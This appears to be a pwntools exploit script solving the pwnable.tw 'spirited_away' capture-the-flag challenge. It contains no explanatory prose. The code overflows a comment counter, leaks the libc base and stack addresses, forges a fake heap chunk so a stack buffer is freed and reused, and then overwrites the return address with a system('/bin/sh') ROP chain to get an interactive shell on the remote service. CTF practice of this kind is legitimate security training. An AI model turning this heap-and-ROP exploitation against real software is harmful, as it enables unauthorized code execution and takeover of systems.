#!/home/khanh/.local/share/pipx/venvs/pwntools/bin/python3
from pwn import *

# context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']

e    = context.binary = ELF("./spirited_away_patched")
libc = ELF("./libc_32.so.6")

def B(x, enc='utf-8'):
    if isinstance(x, bytes):
        return x
    return str(x).encode(enc)


def connect():
    HOST, PORT = "chall.pwnable.tw", 10204

    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        return remote(HOST, PORT)
    return e.process()

def GDB(p):
    script = '''
        b *0x080486f8
    '''
    gdb.attach(p, gdbscript=script)

def comment(p, name, age, reason, cmt):
    p.sendafter(b"Please enter your name: ", B(name))
    p.sendlineafter(b"Please enter your age: ", B(age))
    p.sendafter(b"Why did you came to see this movie? ", B(reason))
    p.sendafter(b"Please enter your comment: ", B(cmt))

def leave_another(p):
    p.sendafter(b"Would you like to leave another comment? <y/n>: ", b"y")

def main():
    p = connect()

    for _ in range(10):
        comment(p, "A", 1, "A" * 20, "A")
        leave_another(p)

    for _ in range(9, 99):
        p.sendlineafter(b"Please enter your name: Please enter your age: ", B(1))
        p.sendafter(b"Why did you came to see this movie? ", b"A")
        leave_another(p)

    # GDB(p)

    comment(p, "A", 1, "A" * 77, "A")

    p.recvline()
    p.recvline()
    stack_raw = p.recvline()

    libc.address = u32(b"\0" + stack_raw[85:88]) - 0x1b0000
    LEAK_EBP    = u32(stack_raw[88:92])
    LEAK_RET    = u32(stack_raw[92:96])

    log.info(f"LIBC BASE -> {hex(libc.address)}")
    log.info(f"LEAK EBP  -> {hex(LEAK_EBP)}")
    log.info(f"LEAK RET  -> {hex(LEAK_RET)}")

    SYSTEM = libc.symbols["system"]
    log.info(f"SYSTEM ADDRESS -> {hex(SYSTEM)}")

    leave_another(p)

    # ---------------------------
    # Stage 3 — Fake chunk
    # ---------------------------
    FAKE_CHUNK = (
        p32(0) +
        p32(0x41) +
        b"\x00" * 0x3c +
        p32(0x41)
    )

    comment(
        p,
        "A", 1,
        FAKE_CHUNK,
        b"A" * 80 +
        p32(1) +
        p32(LEAK_EBP - 0x70 + 8)
    )

    leave_another(p)

    # ---------------------------
    # Stage 4 — ROP system("/bin/sh")
    # ---------------------------
    BIN_SH = next(libc.search(b"/bin/sh"))
    EXIT   = libc.symbols["exit"]

    log.info(f"BIN_SH ADRESS -> {hex(BIN_SH)}")

    PAYLOAD = (
        b"A" * 0x4c +
        p32(SYSTEM) +
        p32(EXIT) +
        p32(BIN_SH)
    )

    comment(p, PAYLOAD, 1, "A", "A")
    p.sendafter(b"Would you like to leave another comment? <y/n>: ", b"n")

    p.interactive()


if __name__ == '__main__':
    main()